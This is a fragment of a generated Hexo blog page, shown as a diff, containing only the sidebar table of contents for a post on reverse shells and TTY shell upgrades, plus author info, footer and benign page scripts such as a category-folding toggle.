href="#%E5%A6%82%E4%BD%95%E5%8F%8D%E5%BC%B9shell%E5%88%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%94%BB%E5%87%BB%E6%9C%BA%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">如何反弹shell到自己的攻击机：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E8%AE%A9%E4%BD%A0%E7%9A%84-Shell-%E5%8F%98%E5%AE%8C%E7%BE%8E-TTY-%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell-%E5%8D%87%E7%BA%A7"><span class="nav-number">4.</span> <span class="nav-text">如何让你的 Shell 变完美(TTY 交互式 Shell 升级)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8D%87%E7%BA%A7%E6%88%90%E2%80%9C%E5%AE%8C%E5%85%A8%E4%BA%A4%E4%BA%92%E5%BC%8F-Shell%E2%80%9D"><span class="nav-number">4.1.</span> <span class="nav-text">为什么要升级成“完全交互式 Shell”</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-%E9%9D%B6%E6%9C%BA%E5%8D%87%E7%BA%A7%EF%BC%9A"><span class="nav-number">4.2.</span> <span class="nav-text">Linux 靶机升级：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-%E9%9D%B6%E6%9C%BA%E5%8D%87%E7%BA%A7"><span class="nav-number">4.3.</span> <span class="nav-text">Windows 靶机升级</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8Ftips%EF%BC%9A"><span class="nav-number">5.</span> <span class="nav-text">小tips：</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="s0m1ng"
+      src="/images/profile_photo.jpg">
+  <p class="site-author-name" itemprop="name">s0m1ng</p>
+  <div class="site-description" itemprop="description">学习逆向贵在坚持</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">28</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=1327470638&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;1327470638&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">s0m1ng</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+function initCategoryFold() {
+  // 找到所有包含了子分类的 <ul>
+  var childLists = document.querySelectorAll('.category-list-child');
+  
+  childLists.forEach(function(child) {
+    // 防抖：防止 PJAX 刷新导致重复注入图标
+    if (child.parentElement.getAttribute('data-folded') === 'true') return;
+    child.parentElement.setAttribute('data-folded', 'true');
+    
+    // 1. 默认把所有子分类强行隐藏
+    child.style.display = 'none'; 
+    
+    // 2. 创建一个带有黑客风的 [+]/[-] 开关
+    var toggleSpan = document.createElement('span');
+    toggleSpan.innerHTML = ' ➕ ';
+    toggleSpan.style.cursor = 'pointer';
+    toggleSpan.style.fontSize = '12px';
+    toggleSpan.style.marginRight = '5px';
+    
+    // 3. 把开关插到父分类名字的前面
+    var parentLi = child.parentElement;
+    parentLi.insertBefore(toggleSpan, parentLi.firstChild);
+    
+    // 4. 给开关绑定点击事件 (Hook)
+    toggleSpan.addEventListener('click', function(e) {
+      e.stopPropagation(); // 阻止事件冒泡，防止误点分类链接
+      if (child.style.display === 'none') {
+        child.style.display = 'block';
+        toggleSpan.innerHTML = ' ➖ ';
+      } else {
+        child.style.display = 'none';
+        toggleSpan.innerHTML = ' ➕ ';
+      }
+    });
+  });
+}
+
+// 首次加载页面时执行
+document.addEventListener("DOMContentLoaded", initCategoryFold);
+// 如果你的 NexT 开启了 PJAX (无刷新跳转)，保证跳转后依然生效
+document.addEventListener("pjax:success", initCategoryFold);
+</script>
+</body>
+</html>
